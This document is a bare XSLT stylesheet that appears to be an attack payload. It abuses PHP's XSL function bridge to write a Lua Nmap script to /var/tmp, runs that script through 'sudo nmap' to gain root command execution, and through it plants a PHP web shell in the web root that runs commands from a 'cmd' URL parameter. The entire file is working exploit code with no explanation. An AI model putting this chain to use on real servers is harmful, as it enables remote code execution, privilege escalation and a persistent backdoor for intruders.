<?xml version="1.0"?>
<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:php="http://php.net/xsl">
  <xsl:template match="*">
    <html><body>
      <pre>
        <xsl:variable name="lua">
          os.execute('/bin/sh -c \'printf "<?php echo \\\"START\\\"; if(isset($_GET[\\\"cmd\\\"])) { echo shell_exec($_GET[\\\"cmd\\\"] . \\\" 2>&1\\\"); } else { phpinfo(); } echo \\\"END\\\"; ?>" > /var/www/html/qlskdjqslkdjqs.php\'')
        </xsl:variable>

        <xsl:value-of select="php:function('file_put_contents', '/var/tmp/diag_shell.nse', $lua)" />
        <xsl:value-of select="php:function('shell_exec', 'sudo nmap --script=/var/tmp/diag_shell.nse')" />
      </pre>
    </body></html>
  </xsl:template>
</xsl:stylesheet>
